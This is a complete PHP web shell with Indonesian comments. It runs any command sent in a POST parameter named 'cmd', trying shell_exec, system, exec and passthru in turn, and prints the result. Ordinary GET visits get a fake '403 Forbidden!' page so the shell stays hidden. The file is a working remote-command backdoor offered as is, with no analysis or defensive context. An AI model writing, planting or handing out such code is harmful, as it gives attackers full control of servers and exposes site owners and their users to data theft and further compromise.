<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['cmd'])) {
        header('Content-Type: text/plain');

        // Coba beberapa metode eksekusi perintah
        $cmd = $_POST['cmd'];
        $output = '';

        if (function_exists('shell_exec')) {
            $output = shell_exec($cmd);
        } elseif (function_exists('system')) {
            ob_start();
            system($cmd);
            $output = ob_get_clean();
        } elseif (function_exists('exec')) {
            exec($cmd, $output);
            $output = implode("\n", $output);
        } elseif (function_exists('passthru')) {
            ob_start();
            passthru($cmd);
            $output = ob_get_clean();
        } else {
            $output = "Semua fungsi eksekusi diblokir.";
        }

        echo $output;
    } else {
        http_response_code(400);
        echo "Parameter 'cmd' tidak ditemukan.";
    }
} else {
    http_response_code(403);
    echo "403 Forbidden!";
}
?>
